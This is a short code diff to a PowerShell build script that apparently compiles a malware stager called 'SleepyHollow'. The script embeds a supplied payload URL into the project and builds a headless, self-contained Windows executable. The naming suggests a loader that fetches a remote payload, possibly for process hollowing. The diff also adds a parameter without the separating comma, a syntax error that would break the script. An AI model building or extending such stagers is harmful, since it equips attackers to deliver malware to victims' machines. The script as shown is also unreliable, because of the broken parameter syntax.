@@ -1,6 +1,8 @@
 param(
     [Parameter(Mandatory=$true)]
     [string]$PayloadUrl
+    [Parameter(Mandatory=$false)]
+    [string]$OutputPath = ".\SleepyHollow.exe"
 )
 
 function Replace-PayloadUrl{
@@ -22,7 +24,8 @@ function Build-Stager{
     )
     Replace-PayloadUrl $PayloadUrl
     $projectPath = ".\SleepyHollow.csproj"
-    dotnet build /p:DefineConstants="HEADLESS" $projectPath
+    dotnet publish -c Release /p:DefineConstants="HEADLESS" --self-contained $projectPath
+    Move-Item ".\bin\Release\net7.0\win-x64\publish\SleepyHollow.exe" $OutputPath
 }
 
 Build-Stager $PayloadUrl
